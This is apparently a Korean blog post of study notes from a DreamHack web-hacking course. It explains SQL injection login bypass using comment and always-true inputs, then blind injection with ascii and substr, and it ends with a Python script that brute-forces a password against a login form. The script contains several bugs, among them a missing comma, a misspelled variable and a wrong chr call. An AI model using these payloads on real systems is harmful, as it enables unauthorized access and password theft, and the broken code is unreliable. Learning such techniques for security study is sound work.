---
layout: single
title:  "ServerSide : SQL Injection"
categories: DreamHack
tag: [DreamHack, WebHacking,SQL,Injection]
toc: true
author_profile: false
---

# ServerSide : SQL Injection

[SQL Injection](https://dreamhack.io/lecture/courses/191)
 
DMBS에서 관리하는 데이터베이스에는 민감한 정보가 포함될 수 있다. 공격자는 데이터베이스 파일 탈취 SQL Injection 공격 등으로 해당 정보를 확보하고 악용할 수 있다. 

오늘은 DBMS에서 사용하는 쿼리를 임의로 조작해 데이터베이스의 정보를 획득하는 SQL Injection에대해 배운다.

그 전에 Injection은 주입이라는 의미를 가진 단어로 인젝션 공격은 이용자의 입력값이 처리과정에서 구조나 문법적인 데이터로 해석되어 발생하는 취약점이다.

## SQL Injection

SQL 은 DBMS에 데이터를 질의하는 언어이다. 웹 서비스에는 이용자의 입력을 SQL 구문에 포함해 요펑하는 경우가 있다(ex: 로그인, 게시글). 

아래 코드는 로그인 할 때 애플리케이션이 DBMS에 질의하는 쿼리이다.

```sql
SELECT * FROM accounts WHERE user_id='dreamhack' and user_pw='password'
```

쿼리문을 살펴보면 이용자가 입력한 "dreamhack"과 "password"문자열을 SQL 구문에 포함이 된다. 이렇게 문자열을 삽입하는 행위를 SQL Injection이라고 한다. SQL Injection 이 발생하면 조작된 쿼리로 인증을 우회하거나, 데이터베이스의 정보를 유출할 수 있다.


아래 쿼리문은 SQL Injection으로 조작한 쿼리문이다.

```sql
SELECT * FROM accounts WHERE user_id='admin' 
```

쿼리문을 보면 user_pw의 조건문이 사라진걸 알 수 있다.  조작한 쿼리문을 통해 질의하면 DBMS는 ID 가 admin인 계정의 비밀번호를 비교하지않고 해당 계정의 정보를 들고 온다.

주석이나 항상 참이되는 값을 이용해서 쿼리문을 조작 할 수 있다.

----
uid 와 upw를 입력받는 모듈이 있고, 코드가 아래와 같을 때

```sql
Select uid from user_table where uid='' and upw=''
```

문자열을 구별하기 위해 ' 문자를 사용하고 있기 때문에 uid 입력값에 admin'을 입력하면 뒤에 문장들은

```sql
Select uid from user_table where uid='admin'' and upw=''
```
처럼 바뀐다.

뒤에 주석 #을 추가해 뒷 내용을 주석화 할 수 있다.

혹은 admin' or ' 을 입력해 뒷내용이 항상 참으로 만들 수 있다.

### Blind SQL Injection

Blind SQL Injectio이라는 다른 공격기법으로 데이터베이스의 내용을 알 수 있다.

해당 공격 기법은 스무고개 게임과 비슷한 방법으로 질문을 해서 답변을 얻어 알아내는 방법이다.

ascii 값과 substr 함수로 Blind SQL Injection 을 할 수 있다.

----
substr 함수
```python
substr(string , position, length)
substr('ABCD',1,1)='A'
substr('ABCD',2,2)='BC'
```

----

공격 코드

```sql
#  114='r',115='s'

SELECT * FROM user_table WHERE uid = 'adim' and ascii(substr(upw,1,1)) = 114 --' and upw=' '
#False


```

Blind SQL Injection 공격은 하나하나 값을 비교해야되기 때문에 비교적 오랜 시간이 걸린다는 단점이 있다. 이를 해결하기 위해 Python 코드로 자동화해 얻을 수 있다.

```python
import requests
import string

url = 'http://example.com/login'

params = {
    'uid':''
    'upw':''
}

tc = string.ascii_letters + string.digits + string.punctuation

query = '''
admin' and ascii(substr(upw,{idx},1))={val}--
'''

pasword = ''

for idx in range(0,20):
    for ch in tc:
        params['uid'] = query.format(idx=idx,val=ord(ch)).strip("\n")

        c = requests.get(url,params=params)

        print(c.requests.url)
        if c.text.find("Login success") != -1:
            password += chr(ch)
            break

print(f"Password is {password}")
```

